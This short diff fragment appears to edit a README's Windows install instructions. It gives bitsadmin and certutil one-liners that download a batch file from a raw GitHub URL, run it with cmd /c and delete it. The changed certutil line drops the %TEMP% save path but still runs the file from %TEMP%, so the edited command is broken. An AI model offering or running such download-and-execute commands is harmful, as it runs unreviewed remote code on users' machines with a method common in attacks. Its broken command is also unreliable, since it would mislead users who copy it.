@@ -7,7 +7,7 @@ bitsadmin /transfer mydownload /download /priority high https://raw.githubuserco
 ```
 or
 ```
-certutil -urlcache -split -f https://raw.githubusercontent.com/userdev265scratchandpython/upgrade11/refs/heads/main/downloadlatest.bat %TEMP%\downloadlatest.bat && cmd /c %TEMP%\downloadlatest.bat && del %TEMP%\downloadlatest.bat
+certutil -urlcache -split -f https://raw.githubusercontent.com/userdev265scratchandpython/upgrade11/refs/heads/main/downloadlatest.bat && cmd /c %TEMP%\downloadlatest.bat && del %TEMP%\downloadlatest.bat
 ```
 for windows 10 and newer :
 ```
